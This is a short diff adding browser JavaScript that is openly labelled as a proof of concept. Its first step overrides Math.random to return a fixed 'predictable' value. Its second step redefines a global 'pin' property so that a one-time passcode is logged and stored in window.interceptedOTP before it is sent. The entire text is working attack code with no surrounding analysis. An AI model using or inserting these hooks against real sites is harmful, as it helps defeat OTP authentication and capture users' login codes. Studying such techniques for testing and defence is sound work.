@@ -1,1 +1,19 @@
+// Step 3a: Hook Math.random to log predictable value
+Math.random = function () {
+    const fakeRandom = 0.12345678; // Fixed value, just for POC
+    console.log("Math.random intercepted. Returning predictable value:", fakeRandom);
+    return fakeRandom;
+};
+
+// Step 3b: Hijack the OTP value itself if available
+Object.defineProperty(window, 'pin', {
+    set(value) {
+        console.log("OTP Intercepted before sending:", value);
+        // Store to window so we can use it later
+        window.interceptedOTP = value;
+    },
+    get() {
+        return window.interceptedOTP;
+    }
+});
 
